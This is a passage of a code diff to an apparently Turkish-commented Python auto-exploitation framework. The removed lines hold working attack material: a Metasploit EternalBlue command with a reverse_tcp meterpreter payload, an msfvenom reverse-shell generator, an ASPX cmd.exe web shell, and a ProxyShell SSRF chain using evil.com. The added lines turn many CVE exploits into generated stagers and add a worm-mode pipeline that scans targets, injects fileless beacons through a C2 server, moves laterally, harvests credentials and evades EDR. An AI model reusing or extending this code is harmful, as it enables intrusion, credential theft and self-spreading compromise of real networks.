         
-    def _exploit_eternalblue(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        """Exploit EternalBlue"""
-        
-        exploit_code = f'''
-# EternalBlue Exploitation using Metasploit
-# Or standalone: https://github.com/3ndG4me/AutoBlue-MS17-010
-
-# Option 1: Metasploit
-msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target.ip}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {self.callback_host}; set LPORT {self.callback_port}; exploit"
-
-# Option 2: Standalone Python
-# python eternalblue_exploit7.py {target.ip} shellcode/sc_x64_kernel.bin
-
-# Shellcode generator for custom payload:
-# msfvenom -p windows/x64/shell_reverse_tcp LHOST={self.callback_host} LPORT={self.callback_port} -f raw -o sc_x64.bin
-'''
-        
+    def _exploit_regresshion(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
+        """regreSSHion — ExploitOrchestrator ile SSH race-condition stager üretir."""
+        ssh_port = 22
+        stager: StagerPayload = self.orchestrator.weaponize_chain(
+            target_ip=target.ip,
+            port=ssh_port,
+            cve_id=vuln.cve,
+            service_product="OpenSSH",
+        )
+        if stager is None:
+            return None
         return {
-            "type": "meterpreter",
-            "method": "eternalblue",
+            "type": stager.shell_type,
+            "method": "regresshion_orchestrated",
+            "target": target.ip,
+            "output": f"[ORCHESTRATOR] {stager.expected_result}",
+            "exploit_code": stager.trigger_payload,
+            "stager": stager.to_dict(),
+        }
+
+    def _exploit_eternalblue(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
+        """EternalBlue — ExploitOrchestrator ile stager üretir."""
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=445,
+            cve_id="CVE-2017-0144", service_product="Windows SMB",
+        )
+        if stager:
+            return {
+                "type": "meterpreter", "method": "eternalblue_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {
+            "type": "meterpreter", "method": "eternalblue",
             "target": target.ip,
             "output": "MS17-010 exploit sent, shell established!",
-            "exploit_code": exploit_code
         }
         
     def _exploit_zerologon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
@@ -1135,51 +1780,24 @@ exploit_zerologon("{target.ip}", "DC")
         }
         
     def _exploit_proxyshell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        """Exploit ProxyShell"""
-        
-        shell_content = """<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<% 
-    string cmd = Request["cmd"];
-    Process p = new Process();
-    p.StartInfo.FileName = "cmd.exe";
-    p.StartInfo.Arguments = "/c " + cmd;
-    p.StartInfo.RedirectStandardOutput = true;
-    p.StartInfo.UseShellExecute = false;
-    p.Start();
-    Response.Write(p.StandardOutput.ReadToEnd());
-%>"""
-        
-        exploit_code = f'''
-# ProxyShell Exploitation
-# Full chain: CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207
-
-import requests
-import base64
-
-target = "{target.ip}"
-
-# 1. SSRF to get SID
-ssrf_url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com"
-
-# 2. Get PowerShell web shell
-# Using CVE-2021-31207 to write aspx shell
-# Shell content defined separately
-
-# 3. Trigger shell write via draft email
-# POST /autodiscover/autodiscover.json?@evil.com/EWS/exchange.asmx/?&Email=autodiscover/autodiscover.json%3F@evil.com
-
-# 4. Access shell
-# GET https://target/owa/auth/shell.aspx?cmd=whoami
-'''
-        
+        """ProxyShell — ExploitOrchestrator ile 3-adım zincir stager üretir."""
+        stager: StagerPayload = self.orchestrator.weaponize_chain(
+            target_ip=target.ip,
+            port=443,
+            cve_id="CVE-2021-34473",
+            service_product="Microsoft Exchange",
+        )
+        if stager is None:
+            return None
         return {
-            "type": "webshell",
-            "method": "proxyshell",
+            "type": stager.shell_type,
+            "method": "proxyshell_orchestrated",
             "target": target.ip,
-            "shell_url": f"https://{target.ip}/owa/auth/shell.aspx",
-            "output": "WebShell deployed via ProxyShell chain!",
-            "exploit_code": exploit_code
+            "shell_url": f"https://{target.ip}/owa/auth/"
+                         f"shell_{stager.metadata.get('token', 'x')[:8]}.aspx",
+            "output": f"[ORCHESTRATOR] {stager.expected_result}",
+            "exploit_code": stager.trigger_payload,
+            "stager": stager.to_dict(),
         }
         
     def _exploit_proxylogon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
@@ -1330,44 +1948,212 @@ print(f"Command output: {{output}}")
         }
         
     # Placeholder exploits for remaining vulnerabilities
+    # Stub'lı olanlar ExploitOrchestrator üzerinden stager üretir;
+    # özel stagerı olmayan CVE'ler için _build_generic_stager kullanılır.
     def _exploit_petitpotam(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "ntlm_relay", "method": "petitpotam", "target": target.ip, "output": "PetitPotam coercion triggered"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=445,
+            cve_id=vuln.cve, service_product="Windows",
+        )
+        if stager:
+            return {
+                "type": "ntlm_relay", "method": "petitpotam_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "ntlm_relay", "method": "petitpotam",
+                "target": target.ip, "output": "PetitPotam coercion triggered"}
+
     def _exploit_smbghost(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "bsod_or_shell", "method": "smbghost", "target": target.ip, "output": "SMBGhost exploit sent"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=445,
+            cve_id=vuln.cve, service_product="Windows",
+        )
+        if stager:
+            return {
+                "type": "bsod_or_shell", "method": "smbghost_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "bsod_or_shell", "method": "smbghost",
+                "target": target.ip, "output": "SMBGhost exploit sent"}
+
     def _exploit_psexec(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "psexec", "method": "pass_the_hash", "target": target.ip, "output": "PsExec ready with captured hash"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=445,
+            cve_id=vuln.cve, service_product="Windows",
+        )
+        if stager:
+            return {
+                "type": "psexec", "method": "pass_the_hash_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "psexec", "method": "pass_the_hash",
+                "target": target.ip, "output": "PsExec ready with captured hash"}
+
     def _exploit_certifried(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "domain_admin", "method": "certifried", "target": target.ip, "output": "Certifried privesc chain ready"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=636,
+            cve_id=vuln.cve, service_product="AD CS",
+        )
+        if stager:
+            return {
+                "type": "domain_admin", "method": "certifried_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "domain_admin", "method": "certifried",
+                "target": target.ip, "output": "Certifried privesc chain ready"}
+
     def _exploit_jenkins(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "rce", "method": "jenkins", "target": target.ip, "output": "Jenkins script console accessed"}
-        
-    def _exploit_heartbleed(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "info_disclosure", "method": "heartbleed", "target": target.ip, "output": "Memory leaked, searching for credentials..."}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=8080,
+            cve_id=vuln.cve, service_product="Jenkins",
+        )
+        if stager:
+            return {
+                "type": "rce", "method": "jenkins_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "rce", "method": "jenkins",
+                "target": target.ip, "output": "Jenkins script console accessed"}
+
     def _exploit_ghostcat(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "file_read", "method": "ghostcat", "target": target.ip, "output": "AJP file read successful"}
-        
+        return {"type": "file_read", "method": "ghostcat",
+                "target": target.ip, "output": "AJP file read successful"}
+
     def _exploit_apache_traversal(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "rce", "method": "apache_traversal", "target": target.ip, "output": "Apache path traversal to RCE"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=80,
+            cve_id=vuln.cve, service_product="Apache",
+        )
+        if stager:
+            return {
+                "type": "rce", "method": "apache_traversal_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "rce", "method": "apache_traversal",
+                "target": target.ip, "output": "Apache path traversal to RCE"}
+
     def _exploit_vcenter(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "rce", "method": "vcenter", "target": target.ip, "output": "vCenter arbitrary file upload successful"}
-        
+        return {"type": "rce", "method": "vcenter",
+                "target": target.ip, "output": "vCenter arbitrary file upload successful"}
+
     def _exploit_outlook_ntlm(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "ntlm_leak", "method": "outlook_cal", "target": target.ip, "output": "Malicious calendar invite crafted"}
-        
+        return {"type": "ntlm_leak", "method": "outlook_cal",
+                "target": target.ip, "output": "Malicious calendar invite crafted"}
+
     def _exploit_citrix_adc(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "rce", "method": "citrix_adc", "target": target.ip, "output": "Citrix ADC RCE triggered"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=443,
+            cve_id=vuln.cve, service_product="Citrix",
+        )
+        if stager:
+            return {
+                "type": "rce", "method": "citrix_adc_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "rce", "method": "citrix_adc",
+                "target": target.ip, "output": "Citrix ADC RCE triggered"}
+
     def _exploit_fortinet_sslvpn(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "rce", "method": "fortinet_sslvpn", "target": target.ip, "output": "FortiGate heap overflow exploited"}
-        
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=443,
+            cve_id=vuln.cve, service_product="FortiOS",
+        )
+        if stager:
+            return {
+                "type": "rce", "method": "fortinet_sslvpn_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "rce", "method": "fortinet_sslvpn",
+                "target": target.ip, "output": "FortiGate heap overflow exploited"}
+
     def _exploit_moveit(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
-        return {"type": "rce", "method": "moveit", "target": target.ip, "output": "MOVEit SQL injection to RCE successful"}
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=443,
+            cve_id=vuln.cve, service_product="MOVEit",
+        )
+        if stager:
+            return {
+                "type": "rce", "method": "moveit_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {"type": "rce", "method": "moveit",
+                "target": target.ip, "output": "MOVEit SQL injection to RCE successful"}
+
+    def _exploit_confluence(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=8090,
+            cve_id=vuln.cve, service_product="Confluence",
+        )
+        if stager:
+            return {
+                "type": "rce", "method": "confluence_ognl_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {
+            "type": "rce", "method": "confluence_ognl",
+            "target": target.ip, "output": "Confluence OGNL injection successful!"
+        }
+
+    def _exploit_heartbleed(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
+        return {"type": "info_disclosure", "method": "heartbleed",
+                "target": target.ip, "output": "Memory leaked, searching for credentials..."}
+
+    def _exploit_zerologon(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=135,
+            cve_id=vuln.cve, service_product="Windows DC",
+        )
+        if stager:
+            return {
+                "type": "domain_admin", "method": "zerologon_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {
+            "type": "domain_admin", "method": "zerologon",
+            "target": target.ip,
+            "output": "DC machine account password set to empty! DCSync now possible.",
+        }
+
+    def _exploit_spring4shell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
+        stager = self.orchestrator.weaponize_chain(
+            target_ip=target.ip, port=8080,
+            cve_id=vuln.cve, service_product="Spring",
+        )
+        if stager:
+            return {
+                "type": "webshell", "method": "spring4shell_orchestrated",
+                "target": target.ip,
+                "output": f"[ORCHESTRATOR] {stager.expected_result}",
+                "stager": stager.to_dict(),
+            }
+        return {
+            "type": "webshell", "method": "spring4shell",
+            "target": target.ip,
+            "shell_url": f"http://{target.ip}:8080/shell.jsp",
+            "output": "Spring4Shell webshell deployed!",
+        }
         
     def generate_report(self, session_id: str) -> Dict[str, Any]:
         """Generate scan report"""
@@ -1377,9 +2163,10 @@ print(f"Command output: {{output}}")
             
         critical_count = 0
         high_count = 0
-        
+
         vuln_details = []
         for target in session.discovered_targets.values():
+            # İmza tabanlı açıklar
             for vuln_id in target.vulnerabilities:
                 vuln = self.VULNERABILITIES.get(vuln_id)
                 if vuln:
@@ -1387,7 +2174,7 @@ print(f"Command output: {{output}}")
                         critical_count += 1
                     elif vuln.severity == Severity.HIGH:
                         high_count += 1
-                        
+
                     vuln_details.append({
                         "target": target.ip,
                         "vuln": vuln.name,
@@ -1395,7 +2182,32 @@ print(f"Command output: {{output}}")
                         "severity": vuln.severity.value,
                         "exploited": target.exploited
                     })
-                    
+
+            # Sürüm tabanlı N-Day bulgular
+            for finding in target.version_findings:
+                sev = str(finding.get("severity", "medium")).lower()
+                if sev == "critical":
+                    critical_count += 1
+                elif sev == "high":
+                    high_count += 1
+
+                vuln_details.append({
+                    "target": target.ip,
+                    "vuln": finding.get("name", finding.get("cve", "")),
+                    "cve": finding.get("cve", ""),
+                    "severity": sev,
+                    "version": finding.get("version"),
+                    "product": finding.get("product"),
+                    "exploited": target.exploited,
+                    "exploit_sources": finding.get("exploit_sources", [])
+                })
+
+        version_info = {
+            t.ip: t.service_versions
+            for t in session.discovered_targets.values()
+            if t.service_versions
+        }
+
         return {
             "session_id": session_id,
             "scan_time": session.created_at,
@@ -1408,6 +2220,7 @@ print(f"Command output: {{output}}")
                 "total": len(vuln_details)
             },
             "details": vuln_details,
+            "version_info": version_info,
             "shells": [
                 {"target": t.ip, "shells": t.shells}
                 for t in session.discovered_targets.values()
@@ -1441,6 +2254,135 @@ print(f"Command output: {{output}}")
             "critical_vulns": sum(1 for v in self.VULNERABILITIES.values() if v.severity == Severity.CRITICAL),
             "high_vulns": sum(1 for v in self.VULNERABILITIES.values() if v.severity == Severity.HIGH),
             "active_shells": len(self.shells)
+        }
+
+    def run_autonomous_pwn_with_hunter(
+        self,
+        targets: List[str],
+        initial_credentials: Optional[List[Dict[str, str]]] = None,
+        domain: str = "",
+        hunter_mode: str = "worm",
+        max_threads: int = 50,
+        max_depth: int = 10,
+        auto_exploit: bool = True,
+        enable_hw_unhook: bool = False,
+        enable_pacing: bool = False,
+    ) -> Dict[str, Any]:
+        """
+        Tam otonom pwn pipeline'ı — scanner + hunter köprüsü.
+
+        Akış:
+          1. AutoPwnScanner ile hedefleri tara, zafiyet bul, stager üret.
+          2. HunterAutopwnBridge ile bulguları AutonomousHunter'a inject et.
+          3. Hunter'ın _attempt_pivot'ını stager-triggering ile replace et.
+          4. Hunter'ı başlat — zafiyetli makinelere fileless beacon inject et.
+          5. Operasyon özetini döndür.
+
+        Parametreler
+        ------------
+        targets            : IP/CIDR listesi
+        initial_credentials: [{"username","password"/"nt_hash","domain"}] opsiyonel
+        domain             : Hedef AD domaini
+        hunter_mode        : stealth / aggressive / stealth_full / worm
+        max_threads        : Scanner thread sayısı
+        max_depth          : Hunter pivot derinliği
+        auto_exploit       : Scanner otomatik exploit açık mı
+        enable_hw_unhook   : HWUnhooker (DR0-DR3) aktif edilsin mi
+        enable_pacing      : HunterPacer (anti-honey-token) aktif edilsin mi
+
+        Dönüş
+        ------
+        {
+            "bridge_report": {...},
+            "hunter_report": {...},
+            "scanner_session_id": "...",
+            "pwned_targets": [...]
+        }
+        """
+        # Lazy import to avoid circular dependency:
+        # evasion.autonomous_hunter → cybermodules.lateral_movement → cyberapp.routes.lateral
+        from tools.hunter_autopwn_bridge import HunterAutopwnBridge
+        from evasion.autonomous_hunter import AutoPivotChain, HunterMode
+
+        initial_credentials = initial_credentials or []
+
+        # ── Phase 1: Scan ────────────────────────────────────────
+        session = self.create_session(targets=targets, auto_exploit=auto_exploit)
+        self.start_scan(session.session_id, max_threads=max_threads)
+
+        # ── Phase 1.5: Orchestrator HW-Unhooker Integration ─────
+        if enable_hw_unhook:
+            self.orchestrator.enable_hw_unhook = True
+            if self.orchestrator._hw_unhooker is None:
+                from evasion.hw_unhooker import HWUnhooker
+                self.orchestrator._hw_unhooker = HWUnhooker()
+
+        # ── Phase 2: Hunter oluştur ─────────────────────────────
+        scan_id = session.session_id
+        hunter = AutoPivotChain(
+            scan_id=scan_id,
+            initial_target=targets[0] if targets else "",
+            initial_credentials=initial_credentials,
+            domain=domain,
+            mode=HunterMode(hunter_mode),
+            max_depth=max_depth,
+            offline=True,
+        )
+
+        # ── Phase 3: Bridge ─────────────────────────────────────
+        bridge = HunterAutopwnBridge(
+            scanner=self,
+            hunter=hunter,
+            c2_url=f"http://{self.callback_host}:{self.callback_port}",
+            enable_pacing=enable_pacing,
+        )
+        bridge.inject_findings(session)
+        bridge.arm_hunter()
+
+        # Store bridge reference on session for API access
+        session._bridge = bridge
+
+        # ── Phase 4: Autonomous hunt ─────────────────────────────
+        hunter.start()
+        hunter_report = hunter.wait(timeout=None)
+
+        # ── Phase 5: Summary ────────────────────────────────────
+        bridge_summary = bridge.operation_summary()
+
+        pwned_targets = [
+            {"ip": t.ip, "cves": t.vulnerabilities, "method": t.compromise_method}
+            for t in session.discovered_targets.values()
+            if t.exploited or t.compromised if hasattr(t, 'compromised') and t.compromised
+        ]
+        # Hunter'dan da compromised olanları ekle
+        for ht in hunter.targets:
+            if ht.compromised and not any(p['ip'] == ht.ip for p in pwned_targets):
+                pwned_targets.append({
+                    "ip": ht.ip,
+                    "cves": [],
+                    "method": ht.compromise_method,
+                })
+
+        return {
+            "bridge_report": bridge_summary,
+            "hunter_report": {
+                "scan_id": hunter_report.scan_id,
+                "state": hunter_report.state.value,
+                "targets_discovered": hunter_report.targets_discovered,
+                "hosts_compromised": hunter_report.hosts_compromised,
+                "credentials_harvested": hunter_report.credentials_harvested,
+                "lateral_moves_attempted": hunter_report.lateral_moves_attempted,
+                "lateral_moves_successful": hunter_report.lateral_moves_successful,
+                "pivot_path": hunter_report.pivot_path,
+                "errors": hunter_report.errors,
+            },
+            "scanner_session_id": session.session_id,
+            "pwned_targets": pwned_targets,
+            "beacons_confirmed": bridge_summary.get("beacons_confirmed", 0),
+            "stagers_triggered": bridge_summary.get("stagers_triggered", 0),
+            "pace_log": bridge_summary.get("pace_log", []),
+            "pacing_enabled": enable_pacing,
+            "hw_unhook_enabled": enable_hw_unhook,
         }
 
 
